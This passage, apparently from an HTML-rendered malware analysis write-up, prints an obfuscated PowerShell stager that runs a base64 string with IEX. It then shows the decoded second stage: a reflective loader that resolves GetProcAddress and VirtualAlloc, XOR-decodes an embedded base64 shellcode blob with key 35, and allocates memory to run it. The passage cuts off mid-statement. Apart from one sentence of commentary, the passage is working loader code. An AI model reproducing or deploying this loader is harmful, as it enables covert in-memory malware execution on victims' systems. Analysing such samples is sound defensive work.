	&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start-job&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IEX&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-RunAs32&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Argument&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aa1234&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;wait-job&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Receive-Job&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IEX&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aa1234&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Decoding that Base 64 string, we get some more powershell:&lt;/p&gt;
&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;func_get_proc_address&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;Param&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_procedure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;		
	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_unsafe_native_methods&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;AppDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CurrentDomain.GetAssemblies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Where-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GlobalAssemblyCache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-And&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;\\&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;System.dll&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Microsoft.Win32.UnsafeNativeMethods&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_gpa&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_unsafe_native_methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;GetProcAddress&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;System.Runtime.InteropServices.HandleRef&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;string&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_gpa&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[System.Runtime.InteropServices.HandleRef](New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;System.Runtime.InteropServices.HandleRef((New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;IntPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_unsafe_native_methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;GetModuleHandle&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_procedure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;func_get_delegate_type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;Param&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
		&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Parameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Position&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Mandatory&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
		&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Parameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Position&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_return_type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_type_builder&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;AppDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CurrentDomain.DefineDynamicAssembly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Reflection.AssemblyName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;ReflectedDelegate&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.Reflection.Emit.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;AssemblyBuilderAccess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DefineDynamicModule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;InMemoryModule&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DefineType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;MyDelegateType&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Class, Public, Sealed, AnsiClass, AutoClass&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;MulticastDelegate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_type_builder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DefineConstructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;RTSpecialName, HideBySig, Public&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.Reflection.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;CallingConventions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Standard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SetImplementationFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Runtime, Managed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_type_builder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DefineMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Invoke&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Public, HideBySig, NewSlot, Virtual&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_return_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SetImplementationFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Runtime, Managed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

	&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_type_builder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CreateType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_code&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;WE+cb9RuCQjjUCtQiI0TGB4J1dBPgo0V3NCa8uyPjqmBK8dDRMC1eXrCzVtVpeJwhl20IeaLS3P6N6C6Dv8BOsrgSIJ4E8rqIiMjy6jc3NwMUVNAIxwkD2vaUYiQUUliMz9juzTzYA6F0o18+ByW2M1Nlw07cBqRa2gqy2nCXFZpeIXe7Bz0+OngCO4t0mwBTqrE57ryhLv7Z2k8hZG0I2tMUFcZA2ASWE5CT1RCUUZ8TEFFVlBAQlcSE018F01HfE4XTRJTVk8XV0oTTQJeLiliQEBGU1cZAwkMCS4pdlBGUQ5iREZNVxkDbkxZSk9PQgwWDRMDC3RKTUdMVFADbXcDFQ0SCgNiU1NPRnRGQWhKVwwWEBQNEBUDC2hrd25vDwNPSkhGA2RGQEhMCi4pI00wrRG/xu5DE7tbfvthhqu0g6etWNjCuPyCJ0JjQnilqipbBxpqpyqc6HMBnQ/GdbD0ll6dbgl33QeSrHsRLljxdclIlo6f1gtWo4KErS1UTA4dIY6RB9PYb2Am6nuT6U9QtqFfH+BKcupt5OZHJNEqaP66Qcv7T4BWMuCm41bGe+DLit7c3BIRFA0TDRMNEiNyKpxO&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-lt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-bxor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_va&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.Runtime.InteropServices.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Marshal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetDelegateForFunctionPointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;func_get_proc_address&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kernel32.dll&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;func_get_delegate_type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[IntPtr]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[UInt32]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[UInt32]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[UInt32]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;IntPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_buffer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_va&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;IntPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var_code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 